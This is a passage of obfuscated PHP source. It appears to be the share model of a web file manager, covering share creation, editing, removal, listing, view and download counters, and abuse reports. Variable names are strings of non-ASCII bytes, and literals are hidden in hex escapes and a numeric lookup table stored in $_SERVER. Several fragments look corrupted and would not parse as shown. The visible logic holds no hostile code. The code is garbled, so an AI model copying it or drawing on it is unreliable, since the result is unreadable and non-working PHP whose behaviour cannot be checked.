«úó©Ë, $æÚçÃ»Û[1845] => $‡èÑôêñ, $æÚçÃ»Û[1938] => $óçÏÆ©´ + time()); if (Session::get($æÚçÃ»Û[1939])) { $ğèùóàÃ[$æÚçÃ»Û[1639]] = Session::get($æÚçÃ»Û[1939]); } else { $ğèùóàÃ[$æÚçÃ»Û[1639]] = 0; } if ($this->get($ «úó©Ë)) { return $this->where(array($æÚçÃ»Û[1937] => $ «úó©Ë))->save($ğèùóàÃ); } else { return $this->add($ğèùóàÃ, array(), !0); } } public function remove($²÷ïöü¥) { return $this->where(array($_SERVER[® ¨Ä®ñ][1937] => $²÷ïöü¥))->delete(); } public function clearTimeout() { return $this->where($_SERVER[® ¨Ä®ñ][1940] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\145"; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\124\151\x6d\145", "\164\151\x6d\x65", "\x69\x6e\163\145\x72\164\54\x75\x70\144\x61\164\x65", "\146\x75\156\x63\164\151\x6f\156"), array("\x63\x72\145\x61\164\145\x54\151\155\145", "\164\x69\x6d\x65", "\151\x6e\163\145\x72\164", "\146\x75\156\x63\164\151\157\x6e"), array("\157\160\x74\x69\157\x6e\x73", '', "\151\x6e\x73\x65\162\164\x2c\165\160\x64\141\164\x65\54\163\x65\154\x65\143\164", "\x6a\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($È™åìï) { $”™ĞÍ½Ş =& $_SERVER[® ¨Ä®ñ]; $š—ÜÊÒ = isset($È™åìï[0]) ? $È™åìï[0] : !1; return array($”™ĞÍ½Ş[1941] => array(USER_ID, $”™ĞÍ½Ş[1942]), $”™ĞÍ½Ş[1886] => array($š—ÜÊÒ, $”™ĞÍ½Ş[1943])); } protected function listSimple() { $é–ÃöÒñ = array($_SERVER[® ¨Ä®ñ][1639] => USER_ID); $êÉÎ¤õ = $this->field($this->fieldList)->where($é–ÃöÒñ)->select(); return $êÉÎ¤õ ? $êÉÎ¤õ : array(); } protected function getInfo($±¦êŸğ‚, $Ô…¼Ãû™ = false) { $·†·¹¿œ =& $_SERVER[® ¨Ä®ñ]; if ($Ô…¼Ãû™) { return $this->_getShareInfo(array($·†·¹¿œ[479] => $±¦êŸğ‚)); } $æÈ”µÑø = $this->cacheFunctionGet($·†·¹¿œ[1888], $±¦êŸğ‚); return $æÈ”µÑø; } public function getInfoByHash($¬Ã¾Şš) { return $this->_getShareInfo(array($_SERVER[® ¨Ä®ñ][481] => $¬Ã¾Şš)); } public function getInfoByPath($Úºßœ§¶) { $ñİğ¡® =& $_SERVER[® ¨Ä®ñ]; $£Î³”Ô = array($ñİğ¡®[1639] => USER_ID, $ñİğ¡®[394] => $Úºßœ§¶); return $this->_getShareInfo($£Î³”Ô); } public function getInfoBySourcePath($’˜éÔç°) { $ğşª€ö =& $_SERVER[® ¨Ä®ñ]; $¡ÂØŠ×ú = array($ğşª€ö[1639] => USER_ID, $ğşª€ö[1158] => $’˜éÔç°); return $this->_getShareInfo($¡ÂØŠ×ú); } private function _getShareInfo($”ÏÖ±çú) { $óãíõ‚’ =& $_SERVER[® ¨Ä®ñ]; $±êôİê¬ = $this->where($”ÏÖ±çú)->find(); if (!$±êôİê¬) { return !1; } $”ÏÖ±çú = array($óãíõ‚’[479] => $±êôİê¬[$óãíõ‚’[479]]); $¢–£‡·ù = $óãíõ‚’[1944]; $ùÊÁéõ = Model($óãíõ‚’[587])->order($óãíõ‚’[392])->field($¢–£‡·ù)->where($”ÏÖ±çú)->select(); if ($±êôİê¬[$óãíõ‚’[394]] == $óãíõ‚’[190]) { $±êôİê¬[$óãíõ‚’[87]] = IO::info($±êôİê¬[$óãíõ‚’[1158]]); } else { $±êôİê¬[$óãíõ‚’[87]] = Model($óãíõ‚’[1309])->pathInfo($±êôİê¬[$óãíõ‚’[394]]); } $±êôİê¬[$óãíõ‚’[1945]] = $ùÊÁéõ; return $±êôİê¬; } protected function getInfoAuth($¶¹‹§õµ) { $ğÅ‚ ª =& $_SERVER[® ¨Ä®ñ]; $™ãÜ×¼Ë = $this->getInfo($¶¹‹§õµ); if ($™ãÜ×¼Ë[$ğÅ‚ ª[1639]] == USER_ID) { $™ãÜ×¼Ë[$ğÅ‚ ª[405]] = $™ãÜ×¼Ë[$ğÅ‚ ª[87]][$ğÅ‚ ª[405]]; } else { $™ãÜ×¼Ë[$ğÅ‚ ª[405]] = Model($ğÅ‚ ª[493])->authMake($™ãÜ×¼Ë[$ğÅ‚ ª[1945]]); } return $™ãÜ×¼Ë; } protected function listData($î˜‚…©´ = null, $°˜ËÄæê = 300) { $àÁÃœüâ =& $_SERVER[® ¨Ä®ñ]; $Áò³ÚÍÕ = array(array($àÁÃœüâ[484] => array($àÁÃœüâ[996], 0), $àÁÃœüâ[486] => array($àÁÃœüâ[996], 0), $àÁÃœüâ[1946] => $àÁÃœüâ[1902])); if ($î˜‚…©´ == $àÁÃœüâ[1947]) { $Áò³ÚÍÕ = array($àÁÃœüâ[484] => 1); } else { if ($î˜‚…©´ == $àÁÃœüâ[1143]) { $Áò³ÚÍÕ = array($àÁÃœüâ[486] => 1); } } $Áò³ÚÍÕ[$àÁÃœüâ[1639]] = USER_ID; $Ş”‘é÷ô = $this->where($Áò³ÚÍÕ)->selectPage($°˜ËÄæê); return $Ş”‘é÷ô; } protected function listToMe($«ğÕ·Â™ = 300) { $€±æä½Ø =& $_SERVER[® ¨Ä®ñ]; $†¤½“Ñº = Model($€±æä½Ø[1948])->userGroupParents(USER_ID); $ıèÉ‹®¿ = array($€±æä½Ø[571] => SourceModel::TYPE_USER, $€±æä½Ø[495] => USER_ID); if ($†¤½“Ñº) { $ıèÉ‹®¿ = array(array($€±æä½Ø[571] => SourceModel::TYPE_USER, $€±æä½Ø[495] => USER_ID), array($€±æä½Ø[571] => SourceModel::TYPE_GROUP, $€±æä½Ø[495] => array($€±æä½Ø[7], $†¤½“Ñº)), $€±æä½Ø[1946] => $€±æä½Ø[1902]); } $º¸ûºŒ­ = Model($€±æä½Ø[587])->where($ıèÉ‹®¿)->selectPage($«ğÕ·Â™); $€üöîÛ¦ = array_to_keyvalue_group($º¸ûºŒ­[$€±æä½Ø[364]], $€±æä½Ø[479]); if (!$€üöîÛ¦) { return $º¸ûºŒ­; } $Œû…œË« = $€±æä½Ø[1949]; $ıèÉ‹®¿ = array($€±æä½Ø[479] => array($€±æä½Ø[410], array_keys($€üöîÛ¦)), $€±æä½Ø[1639] => array($€±æä½Ø[998], $€±æä½Ø[190])); $øÍ¢ÀĞ = $this->field($Œû…œË«)->where($ıèÉ‹®¿)->select(); foreach ($øÍ¢ÀĞ as $¦áÂÍÌ® => &$ó÷ÍŒ”õ) { $ó÷ÍŒ”õ[$€±æä½Ø[1945]] = $€üöîÛ¦[$ó÷ÍŒ”õ[$€±æä½Ø[479]]]; } unset($ó÷ÍŒ”õ); $ò˜ş¥ùâ = array($€±æä½Ø[1950] => $øÍ¢ÀĞ, $€±æä½Ø[1951] => $º¸ûºŒ­[$€±æä½Ø[361]]); return $ò˜ş¥ùâ; } protected function shareAdd($€½¹›³Ö, $œ¥ÃÒˆş) { $ÏÏš¿Èó =& $_SERVER[® ¨Ä®ñ]; $ØœØóô‚ = $this->_addShareData($€½¹›³Ö, $œ¥ÃÒˆş); if (!empty($œ¥ÃÒˆş[$ÏÏš¿Èó[1952]])) { $this->_shareAuthSet($ØœØóô‚, $œ¥ÃÒˆş[$ÏÏš¿Èó[1952]]); } $this->shareEventAdd($€½¹›³Ö, $œ¥ÃÒˆş, $ÏÏš¿Èó[1146]); return $ØœØóô‚; } protected function shareAddSystem($ÖÄœç°, $ıÕÖÛËÍ) { $€¶€ùâ‡ =& $_SERVER[® ¨Ä®ñ]; $ñê»Ä³² = $this->_addShareData($ÖÄœç°, $ıÕÖÛËÍ, $€¶€ùâ‡[1258]); $this->_shareAuthSet($ñê»Ä³², $ıÕÖÛËÍ[$€¶€ùâ‡[1952]]); return $ñê»Ä³²; } private function shareEventAdd($Å—¿şö, $„´ğÌÅ¾, $šóìŞíû = "\141\144\x64") { $òÜĞ¦–‘ =& $_SERVER[® ¨Ä®ñ]; if (!$Å—¿şö || $Å—¿şö == $òÜĞ¦–‘[190]) { return; } if ($šóìŞíû == $òÜĞ¦–‘[1146]) { if ($„´ğÌÅ¾[$òÜĞ¦–‘[484]] == $òÜĞ¦–‘[89]) { Model($òÜĞ¦–‘[555])->eventShare($Å—¿şö, $òÜĞ¦–‘[1953]); } if ($„´ğÌÅ¾[$òÜĞ¦–‘[486]] == $òÜĞ¦–‘[89]) { Model($òÜĞ¦–‘[555])->eventShare($Å—¿şö, $òÜĞ¦–‘[1954]); } return; } $””Úœ’Ê = $this->getInfoByPath($Å—¿şö); $÷ÉÔÈÕÔ = $òÜĞ¦–‘[1955]; if ($””Úœ’Ê[$òÜĞ¦–‘[484]] == $òÜĞ¦–‘[190] && $„´ğÌÅ¾[$òÜĞ¦–‘[484]] == $òÜĞ¦–‘[89]) { $÷ÉÔÈÕÔ = $òÜĞ¦–‘[1953]; } if ($””Úœ’Ê[$òÜĞ¦–‘[484]] == $òÜĞ¦–‘[89] && $„´ğÌÅ¾[$òÜĞ¦–‘[484]] == $òÜĞ¦–‘[190]) { $÷ÉÔÈÕÔ = $òÜĞ¦–‘[1956]; } if ($””Úœ’Ê[$òÜĞ¦–‘[486]] == $òÜĞ¦–‘[190] && $„´ğÌÅ¾[$òÜĞ¦–‘[486]] == $òÜĞ¦–‘[89]) { $÷ÉÔÈÕÔ = $òÜĞ¦–‘[1954]; } if ($””Úœ’Ê[$òÜĞ¦–‘[486]] == $òÜĞ¦–‘[89] && $„´ğÌÅ¾[$òÜĞ¦–‘[486]] == $òÜĞ¦–‘[190]) { $÷ÉÔÈÕÔ = $òÜĞ¦–‘[1957]; } Model($òÜĞ¦–‘[555])->eventShare($Å—¿şö, $÷ÉÔÈÕÔ); return; } private function _addShareData($ÎŸƒ‘Í, $ùıƒÕ’¢ = array(), $¿¤°™ªı = false) { $ş®©§”Ù =& $_SERVER[® ¨Ä®ñ]; $ù´¼‰ÀÔ = $¿¤°™ªı == $ş®©§”Ù[1258] ? 0 : USER_ID; $—“ÍúÆ” = array($ş®©§”Ù[409] => $ÎŸƒ‘Í, $ş®©§”Ù[1630] => $ù´¼‰ÀÔ); if ($ÎŸƒ‘Í == 0) { $—“ÍúÆ” = array($ş®©§”Ù[1958] => $ùıƒÕ’¢[$ş®©§”Ù[1158]], $ş®©§”Ù[1630] => $ù´¼‰ÀÔ); } if ($ÉŸğ³À‚ = $this->where($—“ÍúÆ”)->find()) { return $ÉŸğ³À‚[$ş®©§”Ù[479]]; } if ($ÎŸƒ‘Í == 0) { $–Šğ¨ŸÉ = array($ş®©§”Ù[32] => get_path_this($ùıƒÕ’¢[$ş®©§”Ù[78]])); } else { $–Šğ¨ŸÉ = Model($ş®©§”Ù[807])->sourceInfo($ÎŸƒ‘Í); if (!$–Šğ¨ŸÉ) { return !1; } } if (!$ùıƒÕ’¢[$ş®©§”Ù[1539]]) { $ùıƒÕ’¢[$ş®©§”Ù[1539]] = $–Šğ¨ŸÉ[$ş®©§”Ù[32]]; } $½†£œ…È = array($ş®©§”Ù[1630] => $ù´¼‰ÀÔ, $ş®©§”Ù[409] => $ÎŸƒ‘Í, $ş®©§”Ù[1539] => $ş®©§”Ù[12], $ş®©§”Ù[484] => 0, $ş®©§”Ù[486] => 0, $ş®©§”Ù[1158] => $ş®©§”Ù[12], $ş®©§”Ù[302] => $ş®©§”Ù[12], $ş®©§”Ù[871] => $ş®©§”Ù[12], $ş®©§”Ù[1959] => 0, $ş®©§”Ù[1960] => 0, $ş®©§”Ù[487] => 0, $ş®©§”Ù[488] => $ş®©§”Ù[12], $ş®©§”Ù[481] => $ş®©§”Ù[12]); $±±”‰’Û = explode($ş®©§”Ù[50], $ş®©§”Ù[1961]); foreach ($±±”‰’Û as $Û„¹Á€±) { if (!isset($ùıƒÕ’¢[$Û„¹Á€±])) { continue; } $½†£œ…È[$Û„¹Á€±] = $ùıƒÕ’¢[$Û„¹Á€±]; } $±Ôû· = $this->add($½†£œ…È); $‹óã¤©ˆ = array($ş®©§”Ù[481] => short_id($±Ôû·)); $this->where(array($ş®©§”Ù[478] => $±Ôû·))->save($‹óã¤©ˆ); return $±Ôû·; } private function _shareAuthSet($í çÎ°Â, $¤ÓŒÃóé) { $õ“’óş‚ =& $_SERVER[® ¨Ä®ñ]; if (!is_array($¤ÓŒÃóé)) { return !1; } $”±‡‡±ò = Model($õ“’óş‚[1912]); $”±‡‡±ò->where(array($õ“’óş‚[479] => $í çÎ°Â))->delete(); $áøùì—’ = array(); foreach ($¤ÓŒÃóé as $ñ¥ûçğø) { $ëøâÁŸÊ = SourceModel::TYPE_USER; if ($ñ¥ûçğø[$õ“’óş‚[403]] == SourceModel::TYPE_GROUP) { $ëøâÁŸÊ = SourceModel::TYPE_GROUP; } $åìâ†ŸŸ = array($õ“’óş‚[479] => $í çÎ°Â, $õ“’óş‚[403] => $ëøâÁŸÊ, $õ“’óş‚[495] => intval($ñ¥ûçğø[$õ“’óş‚[495]]), $õ“’óş‚[1908] => 0, $õ“’óş‚[1962] => -1); if ($ñ¥ûçğø[$õ“’óş‚[1908]]) { $åìâ†ŸŸ[$õ“’óş‚[1908]] = $ñ¥ûçğø[$õ“’óş‚[1908]]; } else { if ($ñ¥ûçğø[$õ“’óş‚[1962]]) { $åìâ†ŸŸ[$õ“’óş‚[1962]] = $ñ¥ûçğø[$õ“’óş‚[1962]]; } } $áøùì—’[] = $åìâ†ŸŸ; } return $”±‡‡±ò->addAll($áøùì—’, array(), !0); } public function numViewAdd($÷úØ¹«Ó) { $¥‡èãúº =& $_SERVER[® ¨Ä®ñ]; $ø‡ ¿î = array($¥‡èãúº[478] => $÷úØ¹«Ó); $this->where($ø‡ ¿î)->setAdd($¥‡èãúº[1959]); } public function numDownloadAdd($ªÊ°¸˜š) { $£¶Š‹íÒ =& $_SERVER[® ¨Ä®ñ]; $ÛÀÏØÉ = array($£¶Š‹íÒ[478] => $ªÊ°¸˜š); $this->where($ÛÀÏØÉ)->setAdd($£¶Š‹íÒ[1960]); } protected function shareEdit($ÔØ†”âí, $õ“´©ØÇ) { $ÑŸûŸËŸ =& $_SERVER[® ¨Ä®ñ]; $á­§º­æ = $this->getInfo($ÔØ†”âí); if (!$á­§º­æ) { return !1; } $this->_checkLinkShare($õ“´©ØÇ, $á­§º­æ); $É­æª»© = array(); $ê›‡ç‡ = explode($ÑŸûŸËŸ[50], $ÑŸûŸËŸ[1963]); foreach ($ê›‡ç‡ as $éÎ™ğÉÌ) { if (!array_key_exists($éÎ™ğÉÌ, $õ“´©ØÇ)) { continue; } $É­æª»©[$éÎ™ğÉÌ] = $õ“´©ØÇ[$éÎ™ğÉÌ]; } $this->shareEventAdd($á­§º­æ[$ÑŸûŸËŸ[394]], $õ“´©ØÇ, $ÑŸûŸËŸ[1777]); $this->where(array($ÑŸûŸËŸ[478] => $ÔØ†”âí))->save($É­æª»©); if (isset($õ“´©ØÇ[$ÑŸûŸËŸ[1952]])) { $this->_shareAuthSet($ÔØ†”âí, $õ“´©ØÇ[$ÑŸûŸËŸ[1952]]); } return !0; } private function _checkLinkShare($£ê«äàı, $Ò‹Ğ¯™¯) { $šóåãÀî =& $_SERVER[® ¨Ä®ñ]; if ($£ê«äàı[$šóåãÀî[484]] != $šóåãÀî[89]) { return; } $ş„¥çÍª = $Ò‹Ğ¯™¯[$šóåãÀî[87]][$šóåãÀî[394]]; if ($Ò‹Ğ¯™¯[$šóåãÀî[87]][$šóåãÀî[33]] != $šóåãÀî[192]) { $¶ñ˜†ë¥ = $this->_folderReport($ş„¥çÍª); if (!$¶ñ˜†ë¥) { return; } show_json(LNG($šóåãÀî[1964]) . $šóåãÀî[1965] . $¶ñ˜†ë¥, !1); } $ÏÜç¨©Ñ = Model($šóåãÀî[807])->fileInfoGet($Ò‹Ğ¯™¯[$šóåãÀî[87]][$šóåãÀî[394]]); if (!$ÏÜç¨©Ñ) { return; } $Ç…ùÖÚ = $this->shareFileMeta($ÏÜç¨©Ñ[$šóåãÀî[458]]); if (isset($Ç…ùÖÚ[$šóåãÀî[369]]) && $Ç…ùÖÚ[$šóåãÀî[369]] == $šóåãÀî[89]) { show_json(LNG($šóåãÀî[1966]), !1); } } private function _folderReport($¥ÎÙ™ç¤) { $æ©£åù =& $_SERVER[® ¨Ä®ñ]; $æ’ûô™¶ = array($æ©£åù[458] => array($æ©£åù[996], 0), $æ©£åù[732] => 3); $»É§˜¶ = Model($æ©£åù[1967])->where($æ’ûô™¶)->field($æ©£åù[458])->select(); if (!$»É§˜¶) { return !1; } $»É§˜¶ = array_to_keyvalue($»É§˜¶, $æ©£åù[12], $æ©£åù[458]); $±òÍŸ = $æ©£åù[50] . $¥ÎÙ™ç¤ . $æ©£åù[50]; $æ’ûô™¶ = array($æ©£åù[458] => array($æ©£åù[7], $»É§˜¶), $æ©£åù[512] => array($æ©£åù[378], "\45{$±òÍŸ}\45"), $æ©£åù[422] => 0); $Ï£¦µëß = Model($æ©£åù[807])->where($æ’ûô™¶)->field($æ©£åù[1968])->find(); if (!$Ï£¦µëß) { return !1; } $¥úƒ¦™À = substr($Ï£¦µëß[$æ©£åù[512]], strpos($Ï£¦µëß[$æ©£åù[512]], $±òÍŸ)); $æ’ûô™¶ = array($æ©£åù[394] => array($æ©£åù[7], trim($¥úƒ¦™À, $æ©£åù[50]))); $ÍÖÌ‰É¥ = Model($æ©£åù[807])->where($æ’ûô™¶)->field($æ©£åù[32])->select(); $åÅã¾°¬ = array_to_keyvalue($ÍÖÌ‰É¥, $æ©£åù[12], $æ©£åù[32]); $åÅã¾°¬[] = $Ï£¦µëß[$æ©£åù[32]]; return implode($æ©£åù[8], $åÅã¾°¬); } protected function remove($Æ¿„ƒÈô) { $ ˜¾ııˆ =& $_SERVER[® ¨Ä®ñ]; if (is_array($Æ¿„ƒÈô)) { $Æ¿„ƒÈô = array($ ˜¾ııˆ[7], $Æ¿„ƒÈô); } $·àÆ¼ò‹ = array($ ˜¾ııˆ[479] => $Æ¿„ƒÈô); $¥åŞá´Õ = $this->where($·àÆ¼ò‹)->delete(); if ($¥åŞá´Õ) { Model($ ˜¾ııˆ[587])->where(array($ ˜¾ııˆ[479] => $Æ¿„ƒÈô))->delete(); } $ÃÀò¨Ê¬ = is_array($Æ¿„ƒÈô) ? $Æ¿„ƒÈô[1] : array($Æ¿„ƒÈô); for ($«¨íê†¡ = 0; $«¨íê†¡ < count($ÃÀò¨Ê¬); $«¨íê†¡++) { $İ³¢Ôß = $this->getInfo($ÃÀò¨Ê¬[$«¨íê†¡]); if ($İ³¢Ôß[$ ˜¾ııˆ[486]] == $ ˜¾ııˆ[89]) { Model($ ˜¾ııˆ[555])->eventShare($İ³¢Ôß[$ ˜¾ııˆ[394]], $ ˜¾ııˆ[1957]); } if ($İ³¢Ôß[$ ˜¾ııˆ[484]] == $ ˜¾ııˆ[89]) { Model($ ˜¾ııˆ[555])->eventShare($İ³¢Ôß[$ ˜¾ııˆ[394]], $ ˜¾ııˆ[1956]); } } return $¥åŞá´Õ; } protected function removeBySource($¢•½¤è¼) { $ÇÜóëÌ¯ =& $_SERVER[® ¨Ä®ñ]; $³«Ä²Î = array($ÇÜóëÌ¯[409] => array($ÇÜóëÌ¯[410], $¢•½¤è¼)); $¯É›Şì = $this->field($ÇÜóëÌ¯[479])->where($³«Ä²Î)->select(); $¯É›Şì = array_to_keyvalue($¯É›Şì, $ÇÜóëÌ¯[12], $ÇÜóëÌ¯[479]); if (!$¯É›Şì) { return; } $³«Ä²Î = array($ÇÜóëÌ¯[478] => array($ÇÜóëÌ¯[410], $¯É›Şì)); $this->where($³«Ä²Î)->delete(); Model($ÇÜóëÌ¯[587])->where($³«Ä²Î)->delete(); } public function listAll($ş²¥) { $¹‡¾““Á =& $_SERVER[® ¨Ä®ñ]; $ÁíŸâ½¦ = array(); if ($ş²¥[$¹‡¾““Á[1639]]) { $ÁíŸâ½¦[$¹‡¾““Á[1639]] = $ş²¥[$¹‡¾““Á[1639]]; } if ($ş²¥[$¹‡¾““Á[743]]) { $ŞıÚ¸· = $ş²¥[$¹‡¾““Á[487]] ? $ş²¥[$¹‡¾““Á[487]] : strtotime(date($¹‡¾““Á[1969])); $ÁíŸâ½¦[$¹‡¾““Á[193]] = array($¹‡¾““Á[328], array($ş²¥[$¹‡¾““Á[743]], $ŞıÚ¸·)); } if ($ş²¥[$¹‡¾““Á[33]]) { $ÁíŸâ½¦[$ş²¥[$¹‡¾““Á[33]]] = 1; } else { $ÁíŸâ½¦[] = array($¹‡¾““Á[484] => array($¹‡¾““Á[996], 0), $¹‡¾““Á[486] => array($¹‡¾““Á[996], 0), $¹‡¾““Á[1946] => $¹‡¾““Á[1902]); } if ($ş²¥[$¹‡¾““Á[1898]]) { $ÁíŸâ½¦[] = array($¹‡¾““Á[481] => $ş²¥[$¹‡¾““Á[1898]], $¹‡¾““Á[1539] => array($¹‡¾““Á[378], "\45{$ş²¥[$¹‡¾““Á[1898]]}\x25"), $¹‡¾““Á[1946] => $¹‡¾““Á[1902]); } $ˆÅÕ€Äİ = $this->_makeOrder()->where($ÁíŸâ½¦)->selectPage(20); if (empty($ˆÅÕ€Äİ[$¹‡¾““Á[364]])) { return array(); } $this->_listDataApply($ˆÅÕ€Äİ[$¹‡¾““Á[364]]); return $ˆÅÕ€Äİ; } public function listDataApply($°êšì–) { $this->_listDataApply($°êšì–); return $°êšì–; } private function _listDataApply(&$–³üÜ) { $â¿òŸµÀ =& $_SERVER[® ¨Ä®ñ]; $ıÈ”ó  = array_to_keyvalue($–³üÜ, $â¿òŸµÀ[12], $â¿òŸµÀ[1639]); $´ì×ñ©¹ = Model($â¿òŸµÀ[529])->userListInfo(array_unique($ıÈ”ó )); $•ö‡¯µô = array_to_keyvalue($–³üÜ, $â¿òŸµÀ[12], $â¿òŸµÀ[394]); $¡ñëŠ“ = Model($â¿òŸµÀ[807])->sourceListInfo($•ö‡¯µô, !0); foreach ($–³üÜ as $áœË‰±Í => &$°Í»€Òõ) { $ƒ«ÃØ = $°Í»€Òõ[$â¿òŸµÀ[1639]]; $°Í»€Òõ[$â¿òŸµÀ[1970]] = $´ì×ñ©¹[$ƒ«ÃØ] ? $´ì×ñ©¹[$ƒ«ÃØ] : !1; $àóòƒ  = $°Í»€Òõ[$â¿òŸµÀ[394]]; $°Í»€Òõ[$â¿òŸµÀ[87]] = $¡ñëŠ“[$àóòƒ ] ? $¡ñëŠ“[$àóòƒ ] : !1; if ($°Í»€Òõ[$â¿òŸµÀ[87]][$â¿òŸµÀ[422]] == $â¿òŸµÀ[89]) { unset($–³üÜ[$áœË‰±Í]); } if ($°Í»€Òõ[$â¿òŸµÀ[87]] != $â¿òŸµÀ[190] && !$°Í»€Òõ[$â¿òŸµÀ[87]]) { unset($–³üÜ[$áœË‰±Í]); } } unset($°Í»€Òõ); $–³üÜ = array_values($–³üÜ); } private function _makeOrder($ ‰³àÇ· = '') { $‹©´ğ–¾ =& $_SERVER[® ¨Ä®ñ]; $ÀüúÚ = array($‹©´ğ–¾[193], $‹©´ğ–¾[487], $‹©´ğ–¾[1959], $‹©´ğ–¾[1960]); $ Œ°ùŠ¶ = array($‹©´ğ–¾[439] => $‹©´ğ–¾[440], $‹©´ğ–¾[441] => $‹©´ğ–¾[442]); $–Å€¦õı = Input::get($‹©´ğ–¾[446], $‹©´ğ–¾[7], $‹©´ğ–¾[415], $ÀüúÚ); $ÜíòÌåû = Input::get($‹©´ğ–¾[447], $‹©´ğ–¾[7], $‹©´ğ–¾[1971], array($‹©´ğ–¾[1897], $‹©´ğ–¾[441])); $ÜíòÌåû = $ Œ°ùŠ¶[$ÜíòÌåû]; $ ‰³àÇ· = $ ‰³àÇ· . "{$–Å€¦õı}\40{$ÜíòÌåû}"; return $this->order($ ‰³àÇ·); } public function reportAdd($×½ˆ¸½) { $„ÌÄø˜ =& $_SERVER[® ¨Ä®ñ]; $ÏÌ•Ï—ò = array($„ÌÄø˜[479] => $×½ˆ¸½[$„ÌÄø˜[479]], $„ÌÄø˜[1639] => USER_ID); if (Model($„ÌÄø˜[1967])->where($ÏÌ•Ï—ò)->find()) { return !1; } $ä•é”ºÆ = array($„ÌÄø˜[479] => $×½ˆ¸½[$„ÌÄø˜[479]], $„ÌÄø˜[1539] => $×½ˆ¸½[$„ÌÄø˜[1539]], $„ÌÄø˜[394] => $×½ˆ¸½[$„ÌÄø˜[394]], $„ÌÄø˜[458] => $×½ˆ¸½[$„ÌÄø˜[458]], $„ÌÄø˜[1639] => USER_ID, $„ÌÄø˜[33] => $×½ˆ¸½[$„ÌÄø˜[33]], $„ÌÄø˜[442] => $×½ˆ¸½[$„ÌÄø˜[442]]); return Model($„ÌÄø˜[1967])->add($ä•é”ºÆ); } public function reportList($Ç½³à×) { $Ûøä­µ” =& $_SERVER[® ¨Ä®ñ]; $ş™¿©Æš = array(); if ($Ç½³à×[$Ûøä­µ”[743]]) { $åñ½¹Ø‰ = $Ç½³à×[$Ûøä­µ”[487]] ? $Ç½³à×[$Ûøä­µ”[487]] : strtotime(date($Ûøä­µ”[1969])); $ş™¿©Æš[$Ûøä­µ”[193]] = array($Ûøä­µ”[328], array($Ç½³à×[$Ûøä­µ”[743]], $åñ½¹Ø‰)); } if (isset($Ç½³à×[$Ûøä­µ”[33]]) && in_array($Ç½³à×[$Ûøä­µ”[33]], array($Ûøä­µ”[89], $Ûøä­µ”[426], $Ûøä­µ”[1972], $Ûøä­µ”[1973], $Ûøä­µ”[1974]))) { $ş™¿©Æš[$Ûøä­µ”[33]] = $Ç½³à×[$Ûøä­µ”[33]]; } if (isset($Ç½³à×[$Ûøä­µ”[732]]) && in_array($Ç½³à×[$Ûøä­µ”[732]], array($Ûøä­µ”[190], $Ûøä­µ”[89], $Ûøä­µ”[426], $Ûøä­µ”[1972]))) { $ş™¿©Æš[$Ûøä­µ”[732]] = $Ç½³à×[$Ûøä­µ”[732]]; } $«á®¢‡Õ = Input::get($Ûøä­µ”[447], $Ûøä­µ”[7], $Ûøä­µ”[1971], array($Ûøä­µ”[1897], $Ûøä­µ”[441])); $ô®Áóß = array($Ûøä­µ”[439] => $Ûøä­µ”[440], $Ûøä­µ”[441] => $Ûøä­µ”[442]); $é°¤ÌÆ = $Ûøä­µ”[1975] . $ô®Áóß[$«á®¢‡Õ]; $½áµ½Ò = Model($Ûøä­µ”[1967])->where($ş™¿©Æš)->order($é°¤ÌÆ)->selectPage(20); if (empty($½áµ½Ò[$Ûøä­µ”[364]])) { return array(); } $¨ë“¶Ö– = array_to_keyvalue_group($½áµ½Ò[$Ûøä­µ”[364]], $Ûøä­µ”[732], $Ûøä­µ”[479]); if (!empty($¨ë“¶Ö–[0])) { $Ç½³à× = $¨ë“¶Ö–[0]; $ş™¿©Æš = array($Ûøä­µ”[479] => array($Ûøä­µ”[7], $Ç½³à×)); $ğô¯ëè = $this->where($ş™¿©Æš)->field($Ûøä­µ”[479])->select(); $ğô¯ëè = array_to_keyvalue($ğô¯ëè, $Ûøä­µ”[12], $Ûøä­µ”[479]); $¥ìè¤ÅÈ = array_diff($Ç½³à×, $ğô¯ëè); if (!empty($¥ìè¤ÅÈ)) { foreach ($½áµ½Ò[$Ûøä­µ”[364]] as $ˆÀóæà  => $«ÁÄó) { if (in_array($«ÁÄó[$Ûøä­µ”[479]], $¥ìè¤ÅÈ)) { unset($½áµ½Ò[$Ûøä­µ”[364]][$ˆÀóæà ]); } } } } $this->_listDataApply($½áµ½Ò[$Ûøä­µ”[364]]); return $½áµ½Ò; } public function reportStatus($Ğ†Ğ€Ç¸) { $©éö…òŠ =& $_SERVER[® ¨Ä®ñ]; $ ÌÎ¦´  = array($©éö…òŠ[392] => $Ğ†Ğ€Ç¸[$©éö…òŠ[392]]); $´Æİ£ù = Model($©éö…òŠ[1967])->where($ ÌÎ¦´ )->field($©éö…òŠ[1976])->find(); if (!$´Æİ£ù) { return !1; } $ßªí÷ÍÀ = array($©éö…òŠ[732] => $Ğ†Ğ€Ç¸[$©éö…òŠ[732]]); if ($Ğ†Ğ€Ç¸[$©éö…òŠ[732]] == $©éö…òŠ[1972] && $´Æİ£ù[$©éö…òŠ[732]] == $©éö…òŠ[1972]) { $ßªí÷ÍÀ[$©éö…òŠ[732]] = 0; } $È°Ç™Æ = Model($©éö…òŠ[1967])->where($ ÌÎ¦´ )->save($ßªí÷ÍÀ); if ($Ğ†Ğ€Ç¸[$©éö…òŠ[732]] == $©éö…òŠ[426]) { if ($´Æİ£ù[$©éö…òŠ[458]] != $©éö…òŠ[190] && $this->shareFileMeta($´Æİ£ù[$©éö…òŠ[458]])) { $this->shareFileMeta($´Æİ£ù[$©éö…òŠ[458]], 0); } $this->remove($´Æİ£ù[$©éö…òŠ[479]]); return !0; } if ($È°Ç™Æ && $Ğ†Ğ€Ç¸[$©éö…òŠ[732]] == $©éö…òŠ[1972]) { $å”…°Çœ = $ßªí÷ÍÀ[$©éö…òŠ[732]] == $©éö…òŠ[1972] ? 1 : 0; $this->shareFileMeta($´Æİ£ù[$©éö…òŠ[458]], $å”…°Çœ); $this->removeByFile($´Æİ£ù[$©éö…òŠ[458]]); } return $È°Ç™Æ; } private function removeByFile($¨ƒ§¦Å¿) { $şæö·Ÿ =& $_SERVER[® ¨Ä®ñ]; $ÒĞßøÉ = Model($şæö·Ÿ[807])->where(array($şæö·Ÿ[458] => $¨ƒ§¦Å¿))->field($şæö·Ÿ[394])->select(); $¢¹º—Şà = array_to_keyvalue($ÒĞßøÉ, $şæö·Ÿ[12], 